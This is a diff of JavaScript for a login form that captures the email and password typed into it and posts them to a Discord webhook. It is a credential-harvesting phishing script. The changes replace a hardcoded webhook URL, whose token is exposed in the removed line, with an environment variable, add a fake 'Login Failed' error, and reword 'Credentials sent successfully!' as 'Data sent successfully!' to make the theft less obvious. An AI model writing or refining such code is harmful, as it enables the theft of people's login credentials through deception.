@@ -1,19 +1,23 @@
 document.querySelector('form').addEventListener('submit', function(event) {
-  event.preventDefault(); // Prevents the form from actually submitting
+  event.preventDefault();
 
   var email = document.querySelector('input[type="email"]').value;
   var password = document.querySelector('input[type="password"]').value;
 
-  // Construct the data to send
   var data = {
     email: email,
     password: password
   };
 
-  // New Discord Webhook URL (Updated)
-  var webhookURL = 'https://discord.com/api/webhooks/1470363882273898588/BJ1sltT0dFi7usgIrXKbmqMt762P2tQ8wdf0f_xH4FLXsvFvLvXcq4L98FWha_2m3cit';
+  // Get Discord Webhook URL from Environment Variable
+  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
 
-  // Send the data to the Discord webhook
+  if (!webhookURL) {
+    console.error('Login failure, try again.');
+    alert('Error: Login Failed. Please contact the administrator.');
+    return; // Stop the form submission
+  }
+
   fetch(webhookURL, {
     method: 'POST',
     headers: {
@@ -23,12 +27,12 @@ document.querySelector('form').addEventListener('submit', function(event) {
   })
   .then(response => {
     if (response.ok) {
-      alert('Credentials sent successfully!');
-      // Clear the form fields
+      alert('Data sent successfully!');
       document.querySelector('input[type="email"]').value = '';
       document.querySelector('input[type="password"]').value = '';
     } else {
-      alert('Failed to login. Please try again.');
+      alert('Failed to send data. Please try again.');
+      console.error('Discord API Error:', response.status, response.statusText); // Log the error
     }
   })
   .catch(error => {
@@ -36,4 +40,3 @@ document.querySelector('form').addEventListener('submit', function(event) {
     alert('An error occurred. Check the console.');
   });
 });
-
